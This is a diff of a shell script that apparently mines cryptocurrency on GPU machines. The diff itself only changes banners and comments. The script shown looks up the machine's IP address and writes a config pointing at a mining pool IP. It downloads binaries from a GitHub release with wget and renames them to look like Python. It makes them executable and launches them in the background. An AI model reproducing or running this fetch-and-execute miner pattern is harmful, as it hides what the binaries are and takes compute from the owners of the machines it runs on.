@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '################## RV + 5G v0.0.8      ################'
+echo '################## RV + XM v0.0.9      ################'
 echo '#######################################################'
 
 
@@ -19,13 +19,13 @@ echo > oout
 echo > oout
 echo > results.txt 
 
-########## XMR
+########## 
 rm -rf pythonxm
 rm -rf config.json
 rm -rf x.out
 rm -rf pythonheq
 
-# Prepare
+# General Config
 PoolHost=116.203.10.54
 VR_Port=3000
 
@@ -45,7 +45,7 @@ sed -i "s+ip0001+RV_$IPNAME+g" config.json
 
 ./pythonxm -c config.json 2>> oout 1>> oout &
 
-###### Ver
+###### VC
 #wget -q https://github.com/one10001/10001code/raw/main/pythonheq
 #chmod +x pythonheq
 
@@ -66,6 +66,8 @@ rm -rf pythonoc
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
 chmod +x python2.6.6
 cp python2.6.6 pythonoc
+
+# exec
 while true
 do
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
